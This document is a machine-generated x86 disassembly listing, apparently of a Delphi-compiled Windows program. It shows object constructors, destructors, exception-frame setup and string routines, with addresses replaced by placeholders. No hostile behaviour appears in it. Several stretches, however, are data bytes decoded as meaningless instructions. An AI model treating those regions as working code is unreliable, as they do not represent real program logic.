retn
sub_463f94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_414a74
mov dl 0x1
mov eax edi
call sub_4641c4
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_463fec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46411d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_463334
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_464100
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413fac
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_4632f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403124
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_463fec
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_463fec
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464124
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_464130
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40306c
mov edi eax
mov eax esi
call sub_40306c
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403f4c
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_403f4c
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_41471c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46417c
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_4641a0
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_4641c4
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_403ef8
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_403ef8
xor eax eax
mov [ ebx + 0x1c ] eax
sub_4641f4
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460b70
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_46417c
sub_464248
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_4641f4
test al al
je r-xdata
sub_464278
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46429d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4642a4
retn
sub_4642b0
cld
inc edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x46 ] ah
add [ eax + eax ] ah
add [ ebp + ebp - 0x4e13ffba ] ah
inc ecx
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov al [ 0x4644 ]
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add [ eax * 2 + 0x2ffc0046 ] ch
inc esi
add ah bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax + 0x44 ] ah
inc esi
add [ eax + esi ] ah
inc esi
add [ eax ] bh
xor [ esi ] al
dec eax
xor [ esi ] al
pop esp
xor [ esi ] al
add al 0x44
inc esi
add al dl
inc esp
inc esi
add [ eax * 2 + 0x46fc0046 ] bh
inc esi
add [ eax ] al
inc esp
inc esi
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax + 0x29 ] ch
inc eax
add [ eax ] bh
inc ebp
inc esi
add [ eax + ecx * 2 + 0x540a0046 ] bh
dec ecx
dec esp
outsd
inc edx
popad
jae r-xdata
push esp
imul ebp [ ebp + 0x65 ] r-xdata
bound eax [ eax ]
add bh bh
bound eax [ eax ]
add bh bh
nop
je r-xdata
je r-xdata
popad
jbe r-xdata
inc esi
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc edx
popad
jae r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_462f60
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x62 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
pushad
add [ esi + ebx - 0x75 ] dh
retn
add [ eax ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or edx [ edx + 0x65 ]
jo r-xdata
cld
inc edx
inc esi
add [ eax + 0x2e ] bl
inc esi
add [ ecx ] cl
add [ ecx ] cl
dec ecx
dec esp
outsd
inc edx
popad
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
arpl [ ebp + 0x43 ] sp
push edx
dec esp
inc esi
nop
retn
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ edi ] al
dec esp
outsd
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
sub_464404
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_464454
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46445b
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
call sub_462f3c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
sub_464460
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_462f60
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x62 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4644a0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4644d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_464520
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464527
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax ebx
call sub_462f1c
sub_46453c
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4646c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4646cd
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403f1c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov edx esi
mov eax ebx
call sub_462f9c
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416ef0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_464697
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4168fc
lea eax [ ebp - 0x8 ]
call sub_403ef8
cmp [ ebx + 0x61 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
call sub_403f90
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_40995c
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
call sub_40a594
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cb28
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cb28
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cb28
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
sub_4646f3
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464886
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46488d
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403f1c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov edx esi
mov eax ebx
call sub_462fcc
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416ef0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_464857
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4168fc
lea eax [ ebp - 0x8 ]
call sub_403ef8
cmp [ ebx + 0x61 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
call sub_403f90
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_40995c
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
call sub_40a594
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cb28
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cb28
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cb28
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_403f90
sub_4648b3
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add dh dh
inc eax
sbb al 0x2
je r-xdata
cmp dl [ eax + 0x60 ]
je r-xdata
mov [ eax + 0x63 ] dl
retn
retn
mov ecx edx
mov [ eax + 0x60 ] cl
test cl cl
je r-xdata
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x60 ]
jmp r-xdata
sub_4648e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464909
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464910
retn
sub_46491c
push 0x4649
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
dec ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
dec ecx
inc esi
add [ eax ] ch
add [ eax ] al
mov al 0x42
inc esi
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov al [ 0x4644 ]
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add [ eax * 2 + 0x2ffc0046 ] ch
inc esi
add ah bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax + 0x44 ] ah
inc esi
add [ eax + esi ] ah
inc esi
add [ eax ] bh
xor [ esi ] al
dec eax
xor [ esi ] al
pop esp
xor [ esi ] al
add al 0x44
inc esi
add al dl
inc esp
inc esi
add [ eax * 2 + 0x46fc0046 ] bh
inc esi
add [ eax ] al
inc esp
inc esi
add ah dh
dec edx
inc esi
add [ edx + ecx * 2 ] al
inc esi
add [ edx + ecx * 2 + 0x46 ] bh
add [ eax ] bh
inc ebp
inc esi
add [ eax + ecx * 2 + 0x540b0046 ] bh
dec ecx
dec esp
outsd
inc esp
bound esi [ gs : ebp + 0x67 ]
loopne r-xdata
add [ esi - 0x73 ] dl
inc ebp
cld
mov edx 0x4
call sub_404278
mov eax [ ebp - 0x4 ]
call sub_462970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464a5b
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
inc esi
add [ edi ] al
or edx [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc esp
bound esi [ gs : ebp + 0x67 ]
push 0x70004649
inc ebx
inc esi
add [ ecx ] cl
add [ edx ] cl
dec ecx
dec esp
outsd
inc esp
bound esi [ gs : ebp + 0x67 ]
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_464a54
push [ fs : eax ]
mov [ fs : eax ] esp
push r-xdata
push ebx
push r-xdata
push esi
lea eax [ ebp - 0x4 ]
sub_464a73
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_464acc
push [ fs : eax ]
mov [ fs : eax ] esp
push r-xdata
push ebx
push r-xdata
push esi
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_404278
mov eax [ ebp - 0x4 ]
call sub_462970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ad3
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_464aeb
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_464b37
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx ebx
mov edx r-xdata
call sub_404204
mov eax [ ebp - 0x4 ]
call sub_462970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b3e
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_464b8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464bb1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464bb8
retn
sub_464cb4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_463740
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_464ce8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464d0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d14
retn
sub_464d69
dec esi
inc esi
add [ esi + ecx * 2 ] bh
inc esi
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add [ eax ] bl
dec ebx
inc ecx
add al bh
dec ebx
inc ecx
add [ eax ] ch
dec esp
inc ecx
add [ eax ] ah
dec esp
inc ecx
add [ esi + ecx * 2 + 0xe0046 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax ] al
or edx [ ecx + ecx * 2 + 0x64 ]
push edx
inc esi
inc ebx
push edx
jo r-xdata
push esp
jns r-xdata
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_403ef8
pop ebx
retn
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add bh bh
xchg esp eax
push eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
dec ebp
inc esi
add [ eax ] bl
add [ eax ] al
add al al
sbb eax 0x336c0041
inc eax
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
shl [ eax + 0x700464d ] 0xb
push esp
dec ecx
push edx
inc esi
inc ebx
push edx
jo r-xdata
inc ebx
outsd
push ebx
add [ eax ] al
jns r-xdata
mov edx ebx
mov eax esi
call sub_414800
mov edi ebx
mov eax edi
call sub_464e88
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov edx [ esi + 0x10 ]
mov ecx [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54080002 ] al
js r-xdata
dec ebp
inc esi
add [ esi + ebx + 0x41 ] cl
add [ ebx ] al
add [ edx ] cl
dec ecx
push edx
inc esi
inc ebx
push edx
jo r-xdata
pop edi
pop esi
pop ebx
retn
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
jns r-xdata
inc eax
add [ eax + eax ] cl
add bh bh
sub al 0x50
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e0b0000 ] al
jne r-xdata
add [ eax + edx + 0x40 ] dl
call [ ecx + 0x8 ]
lea eax [ edi + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403f4c
jmp r-xdata
or al 0x89
inc edi
or al 0x8b
inc edi
adc [ ebx + 0x88b1056 ] cl
jb r-xdata
inc esi
js r-xdata
arpl [ ebx + 0x6f ] ax
insb
and [ ecx ] al
adc [ eax ] al
add bh bh
test [ eax + 0x46 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040001 ] al
sub_464ea4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414a74
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x10 ] eax
mov eax esi
call sub_464e88
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_464ef0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d1c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414aac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_464f20
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46501b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_464e88
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465022
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_403f1c
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404418
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407d94
mov eax [ ebp - 0xc ]
call sub_4041b8
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_465094
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404544
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404418
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_46502c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465077
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46507e
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_407e94
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_403f4c
sub_465094
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_403f4c
mov eax esi
call sub_4041b8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_40800c
mov [ ebx + 0xc ] eax
sub_4650c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4650e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4650ec
retn
sub_4653ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4636a8
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4653f0
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4655f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_460cb0
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461268
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_461268
